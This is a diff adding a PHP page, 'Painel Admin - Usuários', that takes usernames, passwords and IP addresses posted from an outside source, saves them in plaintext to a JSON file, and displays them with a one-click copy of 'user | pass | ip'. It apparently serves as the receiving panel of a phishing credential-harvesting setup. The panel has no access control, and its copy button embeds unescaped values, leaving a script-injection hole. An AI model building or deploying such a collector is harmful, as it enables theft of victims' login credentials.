@@ -1,0 +1,116 @@
+<?php
+// Arquivo: index.php
+session_start();
+
+// Arquivo de dados
+$arquivo = "usuarios.json";
+
+// Se não existir, cria vazio
+if (!file_exists($arquivo)) {
+    file_put_contents($arquivo, json_encode([]));
+}
+
+// Carregar usuários
+$usuarios = json_decode(file_get_contents($arquivo), true);
+
+// Adicionar usuário (via POST externo)
+if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["user"], $_POST["pass"])) {
+    $novo = [
+        "id"   => uniqid(),
+        "user" => $_POST["user"],
+        "pass" => $_POST["pass"],
+        "ip"   => $_POST["ip"] ?? $_SERVER['REMOTE_ADDR'],
+        "data" => date("d/m/Y H:i:s")
+    ];
+    $usuarios[] = $novo;
+    file_put_contents($arquivo, json_encode($usuarios, JSON_PRETTY_PRINT));
+    header("Location: index.php");
+    exit;
+}
+
+// Editar usuário
+if (isset($_GET["editar"])) {
+    foreach ($usuarios as &$u) {
+        if ($u["id"] === $_GET["editar"]) {
+            if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["user"], $_POST["pass"])) {
+                $u["user"] = $_POST["user"];
+                $u["pass"] = $_POST["pass"];
+                $u["ip"]   = $_POST["ip"];
+                file_put_contents($arquivo, json_encode($usuarios, JSON_PRETTY_PRINT));
+                header("Location: index.php");
+                exit;
+            }
+            $editando = $u;
+        }
+    }
+}
+
+// Excluir usuário
+if (isset($_GET["excluir"])) {
+    $usuarios = array_filter($usuarios, fn($u) => $u["id"] !== $_GET["excluir"]);
+    file_put_contents($arquivo, json_encode($usuarios, JSON_PRETTY_PRINT));
+    header("Location: index.php");
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Painel Admin - Usuários</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px; }
+        h1 { text-align: center; }
+        .container { max-width: 800px; margin: auto; }
+        .card {
+            background: white; padding: 15px; margin: 10px 0;
+            border-radius: 8px; box-shadow: 0 0 5px rgba(0,0,0,.2);
+        }
+        .btn { padding: 6px 12px; border: none; border-radius: 5px; cursor: pointer; }
+        .edit { background: #ffc107; color: black; }
+        .delete { background: #dc3545; color: white; }
+        .copy { background: #007bff; color: white; }
+        .save { background: #28a745; color: white; }
+        form { margin-top: 10px; }
+        input { padding: 5px; margin: 3px; }
+    </style>
+    <script>
+        function copiar(texto) {
+            navigator.clipboard.writeText(texto).then(() => {
+                alert("Copiado: " + texto);
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>📋 Painel de Usuários</h1>
+
+        <!-- Formulário de edição -->
+        <?php if (isset($editando)): ?>
+            <div class="card">
+                <h2>✏️ Editar Usuário</h2>
+                <form method="post">
+                    <input type="text" name="user" value="<?= htmlspecialchars($editando['user']) ?>" required>
+                    <input type="text" name="pass" value="<?= htmlspecialchars($editando['pass']) ?>" required>
+                    <input type="text" name="ip" value="<?= htmlspecialchars($editando['ip']) ?>" required>
+                    <button class="btn save" type="submit">Salvar</button>
+                </form>
+            </div>
+        <?php endif; ?>
+
+        <!-- Listagem de usuários -->
+        <?php foreach(array_reverse($usuarios) as $u): ?>
+            <div class="card">
+                <b>User:</b> <?= htmlspecialchars($u["user"]) ?><br>
+                <b>Pass:</b> <?= htmlspecialchars($u["pass"]) ?><br>
+                <b>IP:</b> <?= htmlspecialchars($u["ip"]) ?><br>
+                <b>Data:</b> <?= htmlspecialchars($u["data"]) ?><br><br>
+                <button class="btn copy" onclick="copiar('<?= $u['user'] ?> | <?= $u['pass'] ?> | <?= $u['ip'] ?>')">Copiar</button>
+                <a class="btn edit" href="?editar=<?= $u['id'] ?>">Editar</a>
+                <a class="btn delete" href="?excluir=<?= $u['id'] ?>" onclick="return confirm('Excluir este usuário?')">Excluir</a>
+            </div>
+        <?php endforeach; ?>
+    </div>
+</body>
+</html>
